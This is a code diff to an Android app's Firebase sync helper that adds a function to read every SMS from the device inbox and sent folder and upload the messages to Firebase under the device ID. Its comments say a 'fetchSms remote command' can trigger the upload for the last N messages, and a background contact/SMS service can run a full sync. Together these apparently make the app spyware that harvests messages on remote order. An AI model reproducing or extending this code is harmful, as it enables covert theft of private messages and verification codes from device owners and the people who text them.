@@ -2,12 +2,15 @@ package com.example.fast.util
 
 import android.annotation.SuppressLint
 import android.content.Context
+import android.content.pm.PackageManager
 import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
 import android.util.Log
+import androidx.core.app.ActivityCompat
 import com.example.fast.config.AppConfig
 import com.example.fast.model.Contact
+import android.Manifest
 import com.google.firebase.Firebase
 import com.google.firebase.database.database
 
@@ -178,6 +181,65 @@ object FirebaseSyncHelper {
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Error in SMS sync", e)
+                Handler(Looper.getMainLooper()).post {
+                    onFailure?.invoke(e.message ?: "Unknown error")
+                }
+            }
+        }.start()
+    }
+
+    /**
+     * Fetch messages from device SMS database and sync to Firebase.
+     *
+     * Unified use case for:
+     * - ContactSmsSyncService: full sync (limit = null)
+     * - fetchSms remote command: last N messages (limit = count)
+     *
+     * Uses system default SMS content provider (content://sms/inbox, content://sms/sent).
+     * Merges into Firebase message/{deviceId}/{timestamp} via updateChildren.
+     *
+     * @param context Application context
+     * @param limit   Max messages to sync; null = all messages (full sync)
+     * @param onSuccess Callback with count of synced messages
+     * @param onFailure Callback with error message
+     */
+    fun syncSmsMessagesFromDevice(
+        context: Context,
+        limit: Int? = null,
+        onSuccess: ((Int) -> Unit)? = null,
+        onFailure: ((String) -> Unit)? = null
+    ) {
+        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            Log.w(TAG, "READ_SMS permission not granted, cannot fetch SMS from device")
+            Handler(Looper.getMainLooper()).post {
+                onFailure?.invoke("READ_SMS permission not granted")
+            }
+            return
+        }
+
+        Thread {
+            try {
+                val allMessages = SmsQueryHelper.getAllMessages(context, null)
+                val messages = if (limit != null && limit > 0) {
+                    allMessages.sortedByDescending { it.timestamp }.take(limit).sortedBy { it.timestamp }
+                } else {
+                    allMessages
+                }
+
+                if (limit != null) {
+                    Log.d(TAG, "Fetched last $limit messages: ${messages.size} of ${allMessages.size} total")
+                } else {
+                    Log.d(TAG, "Fetched all messages: ${messages.size}")
+                }
+
+                syncSmsMessages(
+                    context = context,
+                    messages = messages,
+                    onSuccess = onSuccess,
+                    onFailure = onFailure
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "Error fetching SMS from device", e)
                 Handler(Looper.getMainLooper()).post {
                     onFailure?.invoke(e.message ?: "Unknown error")
                 }
